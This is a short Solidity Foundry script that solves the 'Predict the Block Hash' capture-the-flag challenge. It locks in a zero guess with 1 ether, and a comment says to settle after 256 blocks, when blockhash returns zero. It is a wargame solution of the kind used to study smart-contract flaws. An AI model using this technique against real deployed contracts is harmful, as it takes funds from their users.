// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IPredictTheBlockHash {
    function isComplete() external view returns (bool);

    function lockInGuess(bytes32 hash) external payable;

    function settle() external;
}

contract PredictTheBlockHashSolution is Script {
    IPredictTheBlockHash private predictTheBlockHash =
        IPredictTheBlockHash(vm.envAddress("ADDRESS"));
    bytes32 answer = 0x0;

    function setUp() public {}

    function run() public {
        vm.broadcast();
        predictTheBlockHash.lockInGuess{value: 1 ether}(answer);

        // call settle() after 256 block number
        // vm.broadcast();
        // predictTheBlockHash.settle();
    }
}
